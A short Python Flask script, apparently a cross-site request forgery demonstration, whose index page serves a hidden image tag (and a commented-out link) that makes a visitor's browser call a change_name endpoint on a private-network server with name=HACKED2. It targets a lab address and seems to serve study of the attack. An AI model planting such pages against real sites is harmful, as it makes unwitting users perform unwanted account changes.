from flask import Flask


app = Flask(__name__)


@app.route('/')
def index():
    #return "<a href='http://192.168.17.134:5565/change_name?name=HACKED'>Click</a>"
    return "<img src='http://192.168.17.134:5565/change_name?name=HACKED2'>"


if __name__=='__main__':
    app.run(host='0.0.0.0',port=5566)
